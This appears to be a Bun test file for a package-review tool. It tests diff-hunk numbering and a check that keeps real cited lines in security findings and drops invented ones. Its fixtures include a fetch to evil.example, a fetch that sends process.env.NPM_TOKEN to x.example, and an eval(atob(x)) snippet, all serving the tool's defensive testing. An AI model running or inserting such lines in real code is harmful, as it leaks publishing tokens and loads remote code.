import { expect, test } from "bun:test";
import { diffLines } from "./prompt.ts";
import { quoteMatches, validateFindings } from "./review.ts";
import { rng } from "./util.ts";

test("diff hunks number every new line correctly and cover every change", () => {
  const rand = rng(1);
  for (let round = 0; round < 300; round++) {
    const a = Array.from({ length: Math.floor(rand() * 60) }, () => `l${Math.floor(rand() * 12)}`);
    const b = [...a];
    for (let e = Math.floor(rand() * 8); e > 0; e--) {
      const at = Math.floor(rand() * (b.length + 1));
      if (rand() < 0.5 && b.length) b.splice(Math.min(at, b.length - 1), 1);
      else b.splice(at, 0, `new${e}`);
    }
    const hunks = diffLines(a, b);
    let added = 0;
    let removed = 0;
    for (const h of hunks) {
      for (const l of h.lines) {
        if (l.newLine !== null) expect(b[l.newLine - 1]).toBe(l.text);
        if (l.kind === "+") added++;
        if (l.kind === "-") removed++;
      }
    }
    // Every line of b is either unchanged from a or reported as added.
    expect(b.length - added).toBe(a.length - removed);
    if (a.join("\n") === b.join("\n")) expect(hunks.length).toBe(0);
  }
});

test("large file with a few insertions stays a small diff", () => {
  const a = Array.from({ length: 20_000 }, (_, i) => `line ${i}`);
  const b = [...a];
  b.splice(15_000, 0, "fetch('https://evil.example/x')");
  b.splice(500, 0, "const q = new Set()");
  const hunks = diffLines(a, b);
  expect(hunks.length).toBe(2);
  expect(hunks.flatMap((h) => h.lines).filter((l) => l.kind === "+").map((l) => l.newLine)).toEqual([501, 15_002]);
});

test("citation checks keep real lines and drop invented ones", () => {
  const enc = new TextEncoder();
  const files = [{ path: "index.js", size: 0, mode: 0o644, data: enc.encode("const a = 1;\nfetch('https://x.example', { body: process.env.NPM_TOKEN });\n") }];
  const { kept, dropped } = validateFindings(
    [
      { file: "index.js", line: 2, quote: "fetch('https://x.example', { body: process.env.NPM_TOKEN })", issue: "exfil", severity: "high" },
      { file: "./index.js:2", line: 2, quote: "process.env.NPM_TOKEN", issue: "token", severity: "high" },
      { file: "index.js", line: 1, quote: "fetch(", issue: "wrong line", severity: "high" },
      { file: "setup.js", line: 1, quote: "x", issue: "no file", severity: "low" },
      { file: "index.js", line: 99, quote: "fetch", issue: "no line", severity: "low" },
    ],
    files,
  );
  expect(kept.length).toBe(2);
  expect(dropped.map((d) => d.why)).toEqual(["quote-not-on-line", "no-such-file", "no-such-line"]);
  expect(quoteMatches("  eval(atob(x))  ", "...eval(atob(x))…")).toBe(true);
});
